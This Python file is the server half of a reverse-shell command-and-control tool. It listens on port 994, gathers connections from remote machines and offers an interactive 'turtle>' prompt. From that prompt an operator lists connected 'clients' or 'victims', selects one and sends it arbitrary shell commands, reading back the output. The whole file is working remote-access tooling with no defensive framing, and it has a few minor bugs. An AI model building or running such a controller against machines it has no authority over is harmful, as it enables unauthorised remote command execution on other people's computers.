import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# Creating a socket ( connect two computers )
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 994
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation Msg " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  #prevents timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been Established :" + address[0])

        except socket.error as msg :
            print("Error accepting connections " + msg)

# 2nd thread function = 1) See all the clients 2)Select a client 3)Send commands to the connected clients
# interactive Prompt/Shell for sending commands
# turtle> list
# 0 Friend-A
# 1 Friend-B
# 2 Friend-C

def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Commnd not recognized!!")

# Display all current active connections with the client

def list_connections():
    results = ""

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + "    " + str(all_addresses[i][0]) + "     " + str(all_addresses[i][1]) + "\n"
    print("-----Clients-----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ',' ') #target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not Valid!!!")
        return None

# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except socket.error as msg:
            print("Error sending commands !!!" + str(msg))
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job that in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()